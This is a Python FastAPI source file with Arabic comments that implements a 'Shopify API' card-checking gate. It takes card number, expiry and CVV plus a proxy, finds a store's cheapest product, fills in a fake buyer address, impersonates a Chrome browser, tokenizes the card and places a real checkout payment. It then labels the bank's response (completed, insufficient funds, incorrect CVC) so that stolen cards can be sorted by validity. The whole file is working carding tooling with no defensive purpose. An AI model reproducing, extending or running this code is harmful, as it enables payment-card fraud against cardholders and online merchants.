from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import random

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token(html):
    """رادار متطور جداً للبحث عن الـ Token في أي مكان في الصفحة"""
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s*name="csrf-token"\s*content="([^"]+)"',
        r'authenticity_token["\']?\s*:\s*["\']([^"\']+)',
        r'Shopify\.Checkout\.token\s*=\s*["\']([^"\']+)'
    ]
    for p in patterns:
        m = re.search(p, html)
        if m: return m.group(1)
    return ""

async def check_shopify(cc_info, store_url, proxy):
    try:
        # تفكيك البطاقة
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=45) as session:
            
            # ========================================================
            # 1. البحث عن أرخص منتج (مع إعطاء الأولوية للمنتج الرقمي)
            # ========================================================
            prod_url = f"{store_url}/products.json?limit=250"
            res1 = await session.get(prod_url)
            if res1.status_code != 200: 
                return {"Response": f"Site Dead or Blocked (HTTP {res1.status_code})", "Price": "-", "Gate": "Shopify API"}
            
            products = res1.json().get('products', [])
            cheapest_variant = None
            min_price = float('inf')
            is_digital = False

            # أ) محاولة إيجاد أرخص منتج رقمي (لا يطلب شحن)
            for p in products:
                for v in p.get('variants', []):
                    price = float(v.get('price', 0.0))
                    if price > 0 and v.get('available') and v.get('requires_shipping') is False:
                        if price < min_price:
                            min_price = price
                            cheapest_variant = str(v.get('id'))
                            is_digital = True

            # ب) إذا لم يجد منتج رقمي، يبحث عن أرخص منتج ملموس
            if not cheapest_variant:
                min_price = float('inf')
                for p in products:
                    for v in p.get('variants', []):
                        price = float(v.get('price', 0.0))
                        if price > 0 and v.get('available'):
                            if price < min_price:
                                min_price = price
                                cheapest_variant = str(v.get('id'))

            if not cheapest_variant:
                return {"Response": "No active products found", "Price": "-", "Gate": "Shopify API"}

            price_str = f"${min_price}"

            # ========================================================
            # 2. الباب الخلفي (Cart Permalink + حقن العنوان)
            # ========================================================
            # هذا الرابط يُنشئ السلة ويُعبي بيانات الشحن تلقائياً لكي يفتح بوابة الدفع فوراً
            email = f"guest{random.randint(10000,99999)}@gmail.com"
            permalink = f"{store_url}/cart/{cheapest_variant}:1?checkout[email]={email}&checkout[shipping_address][first_name]=John&checkout[shipping_address][last_name]=Doe&checkout[shipping_address][address1]=123%20Main%20St&checkout[shipping_address][city]=New%20York&checkout[shipping_address][country]=US&checkout[shipping_address][province]=NY&checkout[shipping_address][zip]=10001"

            res2 = await session.get(permalink, allow_redirects=True)
            checkout_url = str(res2.url)
            html = res2.text

            # ========================================================
            # 3. استخراج الرموز والبوابات من الصفحة المفتوحة
            # ========================================================
            auth_token = extract_token(html)
            
            # إذا ظهرت حماية كلاودفلير أثناء التحويل
            if "Just a moment" in html or "cloudflare" in html.lower() or res2.status_code in [403, 429]:
                return {"Response": "Cloudflare Challenge Blocked Request", "Price": price_str, "Gate": "Shopify API"}

            # استخراج ID بوابة الدفع ديناميكياً (وليس رقم 1 الثابت)
            gateway_id = "1"
            gw_match = re.search(r'data-subgateway=["\']([^"\']+)["\']', html)
            if not gw_match:
                gw_match = re.search(r'value=["\']([^"\']+)["\']\s*name="checkout\[payment_gateway\]"', html)
            if gw_match: gateway_id = gw_match.group(1)

            # ========================================================
            # 4. تشفير البطاقة
            # ========================================================
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            
            res3 = await session.post(token_url, json=token_payload)
            if res3.status_code != 200: 
                return {"Response": "Failed to tokenize card (IP Banned)", "Price": price_str, "Gate": "Shopify API"}
            
            payment_token = res3.json().get("id")

            # ========================================================
            # 5. إرسال طلب الدفع القاضي (The Payload)
            # ========================================================
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id,
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "checkout[remember_me]": "false",
                "button": ""
            }
            
            res4 = await session.post(checkout_url, data=payment_payload)
            result_html = res4.text.lower()
            
            # ========================================================
            # 6. تحليل رد البنك بدقة
            # ========================================================
            if "thank you" in result_html or "order completed" in result_html or res4.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": price_str, "Gate": "Shopify API"}
            elif "insufficient funds" in result_html: return {"Response": "Insufficient Funds", "Price": price_str, "Gate": "Shopify API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: return {"Response": "Incorrect CVC", "Price": price_str, "Gate": "Shopify API"}
            elif "zip code does not match" in result_html or "avs" in result_html: return {"Response": "ZIP Code Mismatch", "Price": price_str, "Gate": "Shopify API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: return {"Response": "Do Not Honor", "Price": price_str, "Gate": "Shopify API"}
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res4.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": price_str, "Gate": "Shopify API"}
                return {"Response": "Declined / Form Error", "Price": price_str, "Gate": "Shopify API"}

    except Exception as e:
        err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out").replace("502", "err")
        return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
